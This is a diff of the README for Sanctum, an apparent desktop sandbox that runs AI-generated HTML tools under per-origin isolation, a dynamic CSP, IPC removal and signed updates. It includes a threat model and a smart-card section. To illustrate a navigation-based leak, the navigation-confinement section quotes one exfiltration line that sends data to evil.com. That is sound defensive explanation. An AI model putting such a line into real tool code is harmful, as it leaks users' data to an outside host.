@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="assets/banner.svg" alt="Sanctum — Run AI-generated tools. See what they can touch. Block everything else." width="100%">
+  <img src="assets/banner.svg" alt="Sanctum: a desktop sandbox for AI-generated HTML tools" width="100%">
 </p>
 
 <p align="center">
@@ -11,11 +11,11 @@
 
 <br>
 
-AI tools are black boxes. Sanctum changes that.
+Sanctum is a desktop app for running the single-file HTML tools that AI models write.
 
-Paste an HTML tool. Sanctum scans it, tells you exactly what it wants — camera, network endpoints, storage, geolocation — and lets you approve only what you're comfortable with. The tool runs in a hard-isolated sandbox with a dynamically built Content Security Policy matching your approvals. Everything else is blocked before the tool's code runs.
+When you add a tool, Sanctum scans the source and lists what it uses, such as the camera, network hosts, storage or geolocation. You choose which of those to allow. The tool then runs at its own origin under a Content Security Policy built from your choices, and anything you didn't allow is blocked before the tool's code runs.
 
-Built for people who run AI-generated tools but won't accept "trust me."
+Sanctum is at [sanctum.enigma.sh](https://sanctum.enigma.sh).
 
 ---
 
@@ -23,9 +23,9 @@ Built for people who run AI-generated tools but won't accept "trust me."
 
 | Step | What happens |
 |------|-------------|
-| **Ingest** | Paste from clipboard or load a file. SHA-256 stamps the content. Any subsequent tamper quarantines the tool permanently before it can run. |
+| **Ingest** | Paste from clipboard or load a file. The stored copy is recorded under its SHA-256. If that copy is later modified, the tool is quarantined and won't run. |
 | **Scan** | Static analysis extracts capability signals: `fetch` calls, `getUserMedia`, `WebSocket` endpoints, `navigator.geolocation`, storage APIs, USB / HID / Bluetooth, and more. Literal URL hostnames are extracted from source. |
-| **Approve** | A per-capability permission manifest is shown. Toggle each one. Network access is per-host — approve only the endpoints the tool actually needs. |
+| **Approve** | A per-capability permission manifest is shown. Toggle each one. Network access is per host, so you can approve only the endpoints the tool needs. |
 | **Run** | Tool opens in an isolated window at its own web origin (`sanctum-tool://tool-{id}/`). CSP enforces your approvals. The Tauri IPC bridge is removed by an initialization script before the tool's code executes. |
 
 ---
@@ -34,19 +34,19 @@ Built for people who run AI-generated tools but won't accept "trust me."
 
 **Layers, in enforcement order:**
 
-**1 — Origin isolation.** Each tool runs at a distinct `sanctum-tool://tool-{id}/` origin. `localStorage`, `IndexedDB`, cookies, and service workers are scoped per-origin by the WebView. Two tools can never read each other's storage.
+**1. Origin isolation.** Each tool runs at a distinct `sanctum-tool://tool-{id}/` origin. `localStorage`, `IndexedDB`, cookies, and service workers are scoped per-origin by the WebView. Two tools can never read each other's storage.
 
-**2 — CSP enforcement.** Default is `connect-src 'none'` with every fetch-type directive denied. Approved network hosts are injected as explicit `https://` and `wss://` entries at window creation. Nothing is relaxed unless you approved it. Host strings are validated as DNS hostnames before they reach the policy, so a crafted URL in a tool cannot restructure the header. `form-action` stays `'none'` regardless of approvals — it does not inherit from `default-src`, and approving a fetch destination is not approving a navigation target.
+**2. CSP enforcement.** Default is `connect-src 'none'` with every fetch-type directive denied. Approved network hosts are injected as explicit `https://` and `wss://` entries at window creation. Host strings are validated as DNS hostnames before they reach the policy, so a crafted URL in a tool cannot restructure the header. `form-action` stays `'none'` whatever you approve. It doesn't inherit from `default-src`, and a host you approved for fetches isn't approved as a navigation target.
 
-**2a — Navigation confinement.** No CSP directive governs top-level navigation, so `connect-src 'none'` alone does not stop `location.href = 'https://evil.com/?' + data`. Tool windows are pinned to their own `sanctum-tool://` origin; every other scheme and host — including `data:`, `file:`, and other tools' origins — is refused.
+**2a. Navigation confinement.** No CSP directive governs top-level navigation, so `connect-src 'none'` alone does not stop `location.href = 'https://evil.com/?' + data`. Tool windows are pinned to their own `sanctum-tool://` origin; every other scheme and host is refused, including `data:`, `file:` and other tools' origins.
 
-**3 — IPC removal.** An initialization script deletes all `__TAURI__*` globals from the window before the tool's HTML is parsed. Tools have zero OS bridge access. The [tool capability set](src-tauri/capabilities/tool-default.json) is empty — all Tauri commands are denied even if IPC bootstrap is present.
+**3. IPC removal.** An initialization script deletes all `__TAURI__*` globals from the window before the tool's HTML is parsed. The [tool capability set](src-tauri/capabilities/tool-default.json) is also empty, so every Tauri command is denied even if a tool recreates the IPC bootstrap.
 
-**4 — Integrity check.** SHA-256 of the stored file is recomputed on every launch. Mismatch → `quarantined = 1` in the DB, window creation aborted, error shown. No exceptions.
+**4. Integrity check.** The SHA-256 of the stored file is recomputed on every launch. On a mismatch Sanctum sets `quarantined = 1` in the database, doesn't create the window, and shows an error.
 
-**5 — Static scan (advisory only).** The scanner drives the permission manifest UI. It is not a security control. Capabilities hidden behind dynamic string construction, obfuscation, or CDN-loaded scripts may be missed. The sandbox enforces limits regardless.
+**5. Static scan (advisory only).** The scanner fills in the permission screen. It isn't a security control. Capabilities hidden behind dynamic string construction, obfuscation, or CDN-loaded scripts may be missed. The sandbox enforces limits either way.
 
-**6 — Signed updates.** Update manifests and payloads are verified against a minisign public key compiled into the binary. An unsigned or tampered update is rejected before it touches disk, so compromising the release host is not enough to push code to installs. Updates are never applied without an explicit click. The check runs in Rust — the updater's IPC surface is granted to no window, so it is unreachable from a tool.
+**6. Signed updates.** Update manifests and payloads are verified against a minisign public key compiled into the binary. An unsigned or tampered update is rejected before it touches disk, so compromising the release host is not enough to push code to installs. Updates are never applied without an explicit click. The check runs in Rust, and no window is granted the updater's IPC commands, so a tool can't reach them.
 
 > **What Sanctum does not prevent:** a tool using only the capabilities you approved, and then doing harmful things with them. Approve capabilities with the same care you'd give any permission prompt.
 
@@ -79,8 +79,8 @@ Release builds are produced by [.github/workflows/release.yml](.github/workflows
 ### Raspberry Pi 400 / arm64 Linux
 
 Two ways to get a build onto a Pi. Both target **Raspberry Pi OS Bookworm,
-64-bit** — the 32-bit image is not a usable target, because WebKitGTK on armhf
-is not something Tauri supports in practice.
+64-bit**. The 32-bit image won't work, because Tauri doesn't support WebKitGTK
+on armhf in practice.
 
 **Download a `.deb` from CI** (no build on the Pi):
 
@@ -124,19 +124,20 @@ needs re-presenting.
 
 ## Status
 
-**v0** — working sandbox, build-from-source only. Not yet signed or distributed.
+**v0.1.0** is the first release. [Download it from GitHub Releases](https://github.com/Enigma-Technologies-Solutions/sanctum/releases/latest). macOS builds are signed and notarized; Windows and Linux builds are unsigned.
 
 | Feature | Status |
 |---------|--------|
-| Paste / file ingest | ✓ |
-| SHA-256 versioning + quarantine | ✓ |
-| Static capability scanner | ✓ heuristic (regex) |
-| Dynamic CSP from approvals | ✓ |
-| Per-tool origin isolation | ✓ |
-| IPC removal | ✓ |
-| SQLite library (list, tag, rollback) | ✓ |
-| Signed + notarized release builds | ✓ macOS · Windows pending |
-| Signed auto-updates | ✓ wired, unverified until first signed release |
+| Paste / file ingest | Done |
+| SHA-256 versioning + quarantine | Done |
+| Static capability scanner | Done (regex heuristics) |
+| Dynamic CSP from approvals | Done |
+| Per-tool origin isolation | Done |
+| IPC removal | Done |
+| SQLite library (list, tag, rollback) | Done |
+| Smart card access, per applet | Done |
+| Signed + notarized release builds | macOS done, Windows pending |
+| Signed auto-updates | Wired up; first real test is the 0.1.1 update |
 | AST-based scanner (catches obfuscation) | roadmap |
 | Org policy file | roadmap |
 | Tool registry / provenance | roadmap |
@@ -147,7 +148,7 @@ needs re-presenting.
 
 ```
 {AppDataDir}/                      # macOS: ~/Library/Application Support/sh.enigma.sanctum
-├── sanctum.db                     # SQLite — tool index, versions, manifests, approvals
+├── sanctum.db                     # SQLite: tool index, versions, manifests, approvals
 └── tools/
     └── {tool_id}/                 # UUID v4
         └── versions/
@@ -191,13 +192,12 @@ Detected patterns:
 
 ### Smart card access
 
-Sanctum exposes one capability that a browser will not: direct APDU exchange
-with a smart card, over the platform PC/SC stack. It exists because the whole
-point of a desktop host is to offer what a web page cannot — a FIDO2 card can
-be driven at the CTAP2 level, including extensions like `hmac-secret` that the
-WebAuthn API deliberately does not expose to pages.
+Sanctum offers one capability that browsers don't: direct APDU exchange with a
+smart card over the platform PC/SC stack. With it, a tool can drive a FIDO2 card
+at the CTAP2 level, including extensions like `hmac-secret` that the WebAuthn
+API doesn't expose to web pages.
 
-Approval is **per applet**, not per device. The scan pulls literal AIDs out of
+Approval is **per applet** rather than per device. The scan pulls literal AIDs out of
 the tool's source, and the prompt names them (`FIDO2 / WebAuthn (CTAP)`) so the
 user is agreeing to something readable. A tool that builds its AID at run time
 gets `(dynamic)`, which grants reader discovery and nothing else.
@@ -223,7 +223,7 @@ anything the page can set. Enforcement lives in `smartcard.rs`:
 |-------|--------|
 | Capability check | No approval → no readers, no sessions, no APDUs. |
 | AID allow-list | `select` refused unless that exact AID was approved. |
-| No re-selection | Raw `transmit` refuses interindustry `SELECT`, `MANAGE CHANNEL`, `GET RESPONSE` — a tool approved for FIDO cannot pivot to PIV or OpenPGP on the same card. |
+| No re-selection | Raw `transmit` refuses interindustry `SELECT`, `MANAGE CHANNEL`, `GET RESPONSE`, so a tool approved for FIDO can't pivot to PIV or OpenPGP on the same card. |
 | Select-before-transmit | Raw APDUs are refused until an approved applet is selected. |
 | Session ownership | Sessions are bound to the opening tool and dropped when its window closes. |
 | Non-destructive disconnect | Every disconnect uses `LeaveCard`; Sanctum never power-cycles a card it did not have to. |
@@ -249,16 +249,16 @@ Scanner limitations: dynamic string construction, obfuscated/minified code, CDN-
 | Tool reaches a card applet it was not approved for | AID allow-list on `select`; interindustry `SELECT`/`MANAGE CHANNEL` refused on the raw channel, so the selected applet cannot change mid-session. |
 | Path traversal | Component-by-component check (reject `..`, absolute, prefix) + `canonicalize` confirmation. |
 
-### What Sanctum does not prevent (v0, honest)
+### What Sanctum does not prevent (v0)
 
-- **Phishing / fake UI** — a tool can display anything. The `⚠ Third-party tool` window title and capability summary are the only mitigations.
-- **LAN timing probes** — `connect-src 'none'` blocks HTTP exfiltration but not timing-based side channels via `<img>` data URIs. Navigation to loopback (`*.localhost`) is permitted on Windows, where the custom protocol is served over `http://<scheme>.localhost`; that path has not yet been verified on a real Windows build.
-- **Cross-tool CPU/memory timing** — same Tauri process; OS-level side channels exist.
-- **Tool crashing the host** — tool window and host share one Tauri process. A WebKit crash in a tool takes down the app.
+- **Phishing / fake UI.** A tool can display anything. The `⚠ Third-party tool` window title and capability summary are the only mitigations.
+- **LAN timing probes.** `connect-src 'none'` blocks HTTP exfiltration but not timing-based side channels via `<img>` data URIs. Navigation to loopback (`*.localhost`) is permitted on Windows, where the custom protocol is served over `http://<scheme>.localhost`; that path has not yet been verified on a real Windows build.
+- **Cross-tool CPU/memory timing.** Tools share one Tauri process, so OS-level side channels exist.
+- **Tool crashing the host.** The tool window and host share one Tauri process. A WebKit crash in a tool takes down the app.
 
 ### Open source note
 
-The host application is fully auditable. Open source does not vouch for third-party tools — every tool is untrusted until proven otherwise.
+Sanctum's own code is open to audit. That says nothing about the tools you run in it, so treat every third-party tool as untrusted.
 
 ---
 
@@ -266,21 +266,21 @@ The host application is fully auditable. Open source does not vouch for third-pa
 
 ```
 src-tauri/src/
-├── lib.rs              — app setup, sanctum-tool:// protocol handler, state
-├── db.rs               — SQLite pool, migrations
-├── models.rs           — ToolRecord, VersionRecord, ToolManifest, DetectedCapability
-├── signing.rs          — Ed25519 verification seam (v1)
-├── device_broker.rs    — hardware consent / elevation stub (v1)
-├── smartcard.rs        — PC/SC broker: AID allow-list, APDU policy, sessions
-├── policy.rs           — org policy file stub (v2)
-├── registry.rs         — server-side provenance client stub (v3)
+├── lib.rs              app setup, sanctum-tool:// protocol handler, state
+├── db.rs               SQLite pool, migrations
+├── models.rs           ToolRecord, VersionRecord, ToolManifest, DetectedCapability
+├── signing.rs          Ed25519 verification seam (v1)
+├── device_broker.rs    hardware consent / elevation stub (v1)
+├── smartcard.rs        PC/SC broker: AID allow-list, APDU policy, sessions
+├── policy.rs           org policy file stub (v2)
+├── registry.rs         server-side provenance client stub (v3)
 └── commands/
-    ├── ingest.rs       — ingest_html, ingest_from_clipboard, ingest_from_path
-    ├── library.rs      — list_tools, get_tool, update_metadata, delete_tool
-    ├── versioning.rs   — create_version, rollback_version, compute_checksum
-    ├── scan.rs         — scan_capabilities, capabilities_for_manifest
-    ├── approvals.rs    — update_approvals
-    └── runner.rs       — open_tool_window (integrity check + dynamic CSP + window)
+    ├── ingest.rs       ingest_html, ingest_from_clipboard, ingest_from_path
+    ├── library.rs      list_tools, get_tool, update_metadata, delete_tool
+    ├── versioning.rs   create_version, rollback_version, compute_checksum
+    ├── scan.rs         scan_capabilities, capabilities_for_manifest
+    ├── approvals.rs    update_approvals
+    └── runner.rs       open_tool_window (integrity check + dynamic CSP + window)
 ```
 
 ---
